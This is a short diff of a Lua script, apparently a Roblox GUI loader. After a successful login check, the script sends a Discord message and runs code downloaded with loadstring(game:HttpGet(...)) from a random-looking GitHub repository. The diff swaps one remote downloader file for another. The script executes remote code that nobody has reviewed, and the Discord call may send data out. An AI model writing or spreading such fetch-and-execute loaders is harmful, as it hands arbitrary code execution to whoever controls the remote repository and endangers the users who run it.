@@ -1930,7 +1930,7 @@ local function SQPC_fake_script() -- Frame.AccountModule
 				IsoginedValue.Value = true
 			end
 			sendDiscordMessage()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/ButtonsDownloader.lua"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
 			coroutine.wrap(StartOther)()
 		else
 			IncorrectSound:Play()
